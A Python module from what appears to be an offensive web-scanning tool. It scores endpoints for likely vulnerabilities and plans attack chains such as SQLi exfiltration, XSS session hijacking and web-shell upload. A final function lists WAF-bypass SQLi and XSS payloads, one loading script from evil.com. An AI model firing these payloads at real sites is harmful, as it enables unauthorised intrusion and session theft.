"""
ai_engine/engine.py
===================
AI Attack Planning Engine

Uses heuristic decision-making to:
1. Analyze discovered endpoints and classify them by attack surface
2. Plan multi-step attack chains (e.g., login bypass → IDOR → data exfil)
3. Prioritize high-value targets using scoring
4. Simulate attacker decision trees
5. Predict vulnerability likelihood using trained ML model

The ML component trains on vulnerability patterns from bug bounty disclosures.
"""

import asyncio
import re
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass, field
from loguru import logger

from core.models import Endpoint, AttackVector, Severity, VulnType, ReconResult


# ── Attack Pattern Library (Heuristics) ──────────────────────────────────────

@dataclass
class AttackPattern:
    """Represents a known multi-step attack chain."""
    name: str
    description: str
    steps: List[str]
    target_params: List[str]
    indicators: List[str]
    severity: Severity
    base_confidence: float


ATTACK_PATTERNS = [
    AttackPattern(
        name="SQL Injection → Data Exfiltration",
        description="Exploit SQLi to extract database credentials and PII",
        steps=[
            "Detect injectable parameter via error-based SQLi",
            "Enumerate database tables via UNION SELECT",
            "Extract sensitive columns (passwords, emails)",
            "Attempt privilege escalation via INTO OUTFILE",
        ],
        target_params=["id", "search", "q", "filter", "user"],
        indicators=["mysql", "sql", "query", "database", "select"],
        severity=Severity.CRITICAL,
        base_confidence=0.75,
    ),
    AttackPattern(
        name="Authentication Bypass → Privilege Escalation",
        description="Bypass login to gain admin access",
        steps=[
            "Identify login endpoint",
            "Attempt SQL injection in auth form",
            "Test for weak/default credentials",
            "Attempt JWT manipulation or session fixation",
            "Escalate to admin role via IDOR",
        ],
        target_params=["username", "password", "email", "token"],
        indicators=["login", "auth", "signin", "session", "token"],
        severity=Severity.CRITICAL,
        base_confidence=0.70,
    ),
    AttackPattern(
        name="XSS → Session Hijacking",
        description="Reflected XSS to steal session cookies",
        steps=[
            "Discover reflected parameter in response",
            "Craft XSS payload bypassing WAF/filters",
            "Exfiltrate session cookie via document.cookie",
            "Replay session for account takeover",
        ],
        target_params=["q", "search", "name", "message", "comment"],
        indicators=["search", "comment", "message", "input", "query"],
        severity=Severity.HIGH,
        base_confidence=0.65,
    ),
    AttackPattern(
        name="IDOR → Mass Data Exposure",
        description="Enumerate object IDs to access unauthorized data",
        steps=[
            "Identify numeric/UUID identifiers in URLs or params",
            "Test sequential enumeration of IDs",
            "Map accessible resources across user boundaries",
            "Attempt bulk data extraction",
        ],
        target_params=["id", "user_id", "account", "order_id", "doc_id"],
        indicators=["profile", "account", "order", "document", "file"],
        severity=Severity.HIGH,
        base_confidence=0.60,
    ),
    AttackPattern(
        name="File Upload → Remote Code Execution",
        description="Upload malicious file to achieve RCE",
        steps=[
            "Discover file upload functionality",
            "Test extension blacklist bypass (e.g., .php → .php5, .phtml)",
            "Upload web shell disguised as image",
            "Execute commands via uploaded file URL",
        ],
        target_params=["file", "upload", "image", "attachment"],
        indicators=["upload", "file", "attachment", "image", "photo"],
        severity=Severity.CRITICAL,
        base_confidence=0.70,
    ),
    AttackPattern(
        name="API Misconfiguration → Data Leak",
        description="Exploit exposed API endpoints to leak sensitive data",
        steps=[
            "Discover undocumented API endpoints via fuzzing",
            "Test for missing authentication on sensitive routes",
            "Check for verbose error messages exposing internals",
            "Exploit CORS misconfiguration for cross-origin data access",
        ],
        target_params=["api", "endpoint", "route", "resource"],
        indicators=["/api/", "/v1/", "/v2/", "json", "graphql"],
        severity=Severity.HIGH,
        base_confidence=0.65,
    ),
]


# ── ML Vulnerability Predictor ────────────────────────────────────────────────

class VulnerabilityPredictor:
    """
    Simple ML model that predicts vulnerability likelihood
    based on endpoint features.

    In production, this would be trained on:
    - HackerOne public disclosures dataset
    - Bugcrowd vulnerability reports
    - NVD/CVE database patterns
    """

    # Feature weights (simplified linear model)
    FEATURE_WEIGHTS = {
        "has_id_param":          0.35,
        "has_search_param":      0.40,
        "has_file_param":        0.45,
        "has_auth_param":        0.30,
        "is_api_endpoint":       0.25,
        "has_form":              0.20,
        "method_is_post":        0.15,
        "numeric_param_value":   0.30,
        "low_response_length":   0.10,
        "has_redirect_param":    0.35,
    }

    VULN_TYPE_INDICATORS = {
        VulnType.SQLI: ["id", "search", "q", "query", "filter", "order", "sort", "page"],
        VulnType.XSS:  ["name", "search", "q", "comment", "message", "title", "desc"],
        VulnType.IDOR: ["id", "uid", "user_id", "account", "profile", "order_id", "doc"],
        VulnType.AUTH: ["login", "signin", "auth", "password", "token", "session"],
        VulnType.CMDI: ["cmd", "exec", "command", "ping", "host", "ip", "shell"],
        VulnType.FILE_UPLOAD: ["file", "upload", "image", "photo", "attachment"],
        VulnType.TRAVERSAL: ["path", "file", "dir", "folder", "include", "page"],
        VulnType.API_MISCONFIG: ["api", "endpoint", "resource", "graphql"],
    }

    def predict(self, endpoint: Endpoint) -> Dict[VulnType, float]:
        """Predict probability of each vuln type for an endpoint."""
        scores = {}
        all_params = set(endpoint.params.keys())
        for form in endpoint.forms:
            all_params.update(form.get("inputs", {}).keys())

        url_lower = endpoint.url.lower()
        all_params_lower = {p.lower() for p in all_params}

        for vuln_type, indicators in self.VULN_TYPE_INDICATORS.items():
            score = 0.0
            matches = sum(1 for ind in indicators if ind in all_params_lower or ind in url_lower)
            score = min(0.95, matches * 0.25 + (0.15 if endpoint.is_api else 0))
            if endpoint.forms and vuln_type in [VulnType.XSS, VulnType.SQLI, VulnType.AUTH]:
                score += 0.15
            if endpoint.method.value == "POST":
                score += 0.10
            scores[vuln_type] = round(min(score, 0.95), 3)

        return scores

    def rank_endpoints(self, endpoints: List[Endpoint]) -> List[Tuple[Endpoint, float]]:
        """Rank endpoints by overall attack potential."""
        ranked = []
        for ep in endpoints:
            scores = self.predict(ep)
            overall = max(scores.values()) if scores else 0.0
            ranked.append((ep, overall))
        return sorted(ranked, key=lambda x: x[1], reverse=True)


# ── Main AI Engine ────────────────────────────────────────────────────────────

class AIEngine:
    """
    Heuristic AI engine that simulates attacker decision-making.
    Plans attack chains, prioritizes targets, and adapts to findings.
    """

    def __init__(self):
        self.predictor = VulnerabilityPredictor()

    async def plan_attacks(
        self,
        endpoints: List[Endpoint],
        recon: Optional[ReconResult] = None,
    ) -> List[AttackVector]:
        """
        Analyze attack surface and generate prioritized attack plan.
        """
        vectors = []
        logger.info(f"[AI] Planning attacks for {len(endpoints)} endpoints")

        # Rank endpoints by attack potential
        ranked = self.predictor.rank_endpoints(endpoints)

        # Match patterns to endpoint clusters
        for pattern in ATTACK_PATTERNS:
            matching_endpoints = self._find_matching_endpoints(pattern, endpoints)
            if matching_endpoints:
                # Boost confidence based on recon findings
                confidence = pattern.base_confidence
                if recon:
                    confidence = self._adjust_confidence_from_recon(confidence, pattern, recon)

                vector = AttackVector(
                    name=pattern.name,
                    description=pattern.description,
                    endpoints=matching_endpoints[:5],
                    steps=pattern.steps,
                    confidence=confidence,
                    estimated_severity=pattern.severity,
                )
                vectors.append(vector)

        # Generate endpoint-specific predictions
        for endpoint, score in ranked[:20]:
            if score > 0.4:
                predictions = self.predictor.predict(endpoint)
                top_vuln = max(predictions, key=predictions.get)
                if predictions[top_vuln] > 0.4:
                    vector = AttackVector(
                        name=f"High-value target: {endpoint.url.split('?')[0][-50:]}",
                        description=f"ML prediction: {top_vuln.value} likely (confidence={predictions[top_vuln]:.0%})",
                        endpoints=[endpoint],
                        steps=[f"Prioritize {top_vuln.value} testing on this endpoint"],
                        confidence=predictions[top_vuln],
                        estimated_severity=Severity.HIGH if predictions[top_vuln] > 0.6 else Severity.MEDIUM,
                    )
                    vectors.append(vector)

        # Sort by confidence descending
        vectors.sort(key=lambda v: v.confidence, reverse=True)

        logger.info(f"[AI] Generated {len(vectors)} attack vectors")
        return vectors[:20]  # Return top 20

    def _find_matching_endpoints(
        self, pattern: AttackPattern, endpoints: List[Endpoint]
    ) -> List[Endpoint]:
        """Find endpoints that match an attack pattern's indicators."""
        matching = []
        for ep in endpoints:
            url_lower = ep.url.lower()
            params_lower = {k.lower() for k in ep.params.keys()}

            # Check URL indicators
            url_match = any(ind in url_lower for ind in pattern.indicators)
            # Check parameter match
            param_match = any(p in params_lower for p in pattern.target_params)

            if url_match or param_match:
                matching.append(ep)

        return matching

    def _adjust_confidence_from_recon(
        self, base: float, pattern: AttackPattern, recon: ReconResult
    ) -> float:
        """Adjust attack confidence based on reconnaissance findings."""
        confidence = base
        techs = [t.lower() for t in recon.technologies]

        # Known vulnerable tech stacks boost confidence
        vulnerable_techs = {
            "wordpress": 0.10, "drupal": 0.08, "joomla": 0.08,
            "php": 0.05, "asp.net": 0.03,
        }
        for tech, boost in vulnerable_techs.items():
            if tech in techs:
                confidence += boost

        # Security headers presence reduces confidence
        headers = {k.lower(): v for k, v in recon.headers.items()}
        if "content-security-policy" in headers:
            confidence -= 0.05
        if "x-frame-options" in headers:
            confidence -= 0.03

        return round(min(0.98, max(0.1, confidence)), 3)

    async def suggest_next_payload(
        self,
        failed_payloads: List[str],
        endpoint: Endpoint,
        target_vuln: VulnType,
    ) -> Optional[str]:
        """
        Suggest the next payload to try based on previous failures.
        Simulates adaptive attacker behavior.
        """
        # Payload mutation strategies
        waf_bypasses = {
            VulnType.SQLI: [
                "' /*!OR*/ 1=1--",
                "' %09OR%091=1--",
                "'/**/OR/**/1=1--",
                "' OORR 1=1--",
            ],
            VulnType.XSS: [
                '<scr<script>ipt>alert(1)</scr</script>ipt>',
                '<img/src/onerror=alert(1)>',
                '"><script/src=//evil.com/x.js></script>',
            ],
        }
        candidates = waf_bypasses.get(target_vuln, [])
        remaining = [p for p in candidates if p not in failed_payloads]
        return remaining[0] if remaining else None
